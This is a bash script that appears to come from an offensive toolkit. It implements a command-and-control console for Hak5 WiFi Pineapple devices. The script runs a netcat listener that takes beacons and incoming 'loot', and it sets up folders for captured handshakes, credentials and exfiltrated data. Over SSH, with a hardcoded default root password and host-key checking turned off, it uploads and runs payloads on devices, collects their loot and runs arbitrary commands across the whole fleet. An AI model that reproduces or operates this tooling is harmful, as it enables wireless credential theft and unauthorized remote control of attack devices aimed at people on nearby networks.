#!/bin/bash
#===============================================================================
#  NULLSEC - HAK5 WIFI PINEAPPLE C2 INTEGRATION
#===============================================================================
#  Command & Control integration for fleet management
#===============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
C2_CONFIG="$SCRIPT_DIR/c2-config.json"
DEVICES_FILE="$SCRIPT_DIR/devices.json"

# Default C2 settings
C2_PORT=1337
C2_LOOT_DIR="$SCRIPT_DIR/loot"

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔════════════════════════════════════════════════════════════════╗
    ║       NULLSEC PINEAPPLE C2 - COMMAND & CONTROL                ║
    ╚════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

init_c2() {
    mkdir -p "$C2_LOOT_DIR"/{handshakes,credentials,exfil,screenshots}
    
    if [[ ! -f "$DEVICES_FILE" ]]; then
        echo '{"devices":[]}' > "$DEVICES_FILE"
    fi
    
    if [[ ! -f "$C2_CONFIG" ]]; then
        cat > "$C2_CONFIG" << CONFIG
{
    "c2_port": 1337,
    "web_port": 8080,
    "loot_dir": "$C2_LOOT_DIR",
    "auto_download_loot": true,
    "notify_on_beacon": true,
    "encryption_key": "$(openssl rand -hex 32)"
}
CONFIG
    fi
}

start_listener() {
    local port="${1:-$C2_PORT}"
    
    log "Starting C2 listener on port $port..."
    
    # Simple netcat listener with handler
    while true; do
        nc -lvnp $port -c '
            read line
            case "$line" in
                BEACON*)
                    echo "[+] Beacon received: $line" >> /tmp/c2.log
                    echo "ACK"
                    ;;
                LOOT*)
                    echo "[+] Loot incoming: $line" >> /tmp/c2.log
                    cat > /tmp/loot_$(date +%s).dat
                    echo "RECEIVED"
                    ;;
                *)
                    echo "UNKNOWN"
                    ;;
            esac
        '
    done
}

deploy_to_pineapple() {
    local target_ip="$1"
    local payload="$2"
    
    if [[ -z "$target_ip" ]] || [[ -z "$payload" ]]; then
        echo "Usage: deploy_to_pineapple <ip> <payload>"
        return 1
    fi
    
    log "Deploying $payload to $target_ip..."
    
    # Upload payload
    sshpass -p 'hak5pineapple' scp -o StrictHostKeyChecking=no \
        "$SCRIPT_DIR/payloads/$payload" \
        root@$target_ip:/root/payloads/
    
    # Execute
    sshpass -p 'hak5pineapple' ssh -o StrictHostKeyChecking=no \
        root@$target_ip "chmod +x /root/payloads/$payload && /root/payloads/$payload"
}

collect_loot() {
    local target_ip="$1"
    
    if [[ -z "$target_ip" ]]; then
        echo "Usage: collect_loot <ip>"
        return 1
    fi
    
    log "Collecting loot from $target_ip..."
    
    mkdir -p "$C2_LOOT_DIR/$target_ip"
    
    sshpass -p 'hak5pineapple' scp -r -o StrictHostKeyChecking=no \
        root@$target_ip:/root/loot/* \
        "$C2_LOOT_DIR/$target_ip/" 2>/dev/null
    
    log "Loot saved to $C2_LOOT_DIR/$target_ip/"
}

fleet_command() {
    local command="$1"
    
    if [[ -z "$command" ]]; then
        echo "Usage: fleet_command <command>"
        return 1
    fi
    
    log "Executing on all devices: $command"
    
    # Read devices from config
    if [[ -f "$DEVICES_FILE" ]]; then
        jq -r '.devices[].ip' "$DEVICES_FILE" | while read ip; do
            info "[$ip] Executing..."
            sshpass -p 'hak5pineapple' ssh -o StrictHostKeyChecking=no \
                root@$ip "$command" 2>/dev/null &
        done
        wait
    fi
}

add_device() {
    local ip="$1"
    local name="${2:-pineapple}"
    
    if [[ -z "$ip" ]]; then
        echo "Usage: add_device <ip> [name]"
        return 1
    fi
    
    # Add to devices file
    local tmp=$(mktemp)
    jq ".devices += [{\"ip\": \"$ip\", \"name\": \"$name\", \"added\": \"$(date -Iseconds)\"}]" \
        "$DEVICES_FILE" > "$tmp" && mv "$tmp" "$DEVICES_FILE"
    
    log "Added device: $name ($ip)"
}

list_devices() {
    echo -e "${CYAN}Registered Devices:${NC}"
    jq -r '.devices[] | "\(.name)\t\(.ip)\t\(.added)"' "$DEVICES_FILE" 2>/dev/null | \
        column -t -s $'\t'
}

interactive_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║       PINEAPPLE C2 MENU              ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  1. List Devices                     ║${NC}"
        echo -e "${CYAN}║  2. Add Device                       ║${NC}"
        echo -e "${CYAN}║  3. Deploy Payload                   ║${NC}"
        echo -e "${CYAN}║  4. Collect Loot                     ║${NC}"
        echo -e "${CYAN}║  5. Fleet Command                    ║${NC}"
        echo -e "${CYAN}║  6. Start Listener                   ║${NC}"
        echo -e "${CYAN}║  0. Exit                             ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select: " choice
        
        case $choice in
            1) list_devices ;;
            2)
                read -p "IP: " ip
                read -p "Name: " name
                add_device "$ip" "$name"
                ;;
            3)
                read -p "Target IP: " ip
                echo "Available payloads:"
                ls -1 "$SCRIPT_DIR/payloads/"*.sh 2>/dev/null | xargs -n1 basename
                read -p "Payload: " payload
                deploy_to_pineapple "$ip" "$payload"
                ;;
            4)
                read -p "Target IP: " ip
                collect_loot "$ip"
                ;;
            5)
                read -p "Command: " cmd
                fleet_command "$cmd"
                ;;
            6)
                read -p "Port [$C2_PORT]: " port
                start_listener "${port:-$C2_PORT}"
                ;;
            0) exit 0 ;;
        esac
    done
}

# Main
banner
init_c2

case "${1:-menu}" in
    listen)
        start_listener "$2"
        ;;
    deploy)
        deploy_to_pineapple "$2" "$3"
        ;;
    loot)
        collect_loot "$2"
        ;;
    fleet)
        shift
        fleet_command "$*"
        ;;
    add)
        add_device "$2" "$3"
        ;;
    list)
        list_devices
        ;;
    menu|*)
        interactive_menu
        ;;
esac
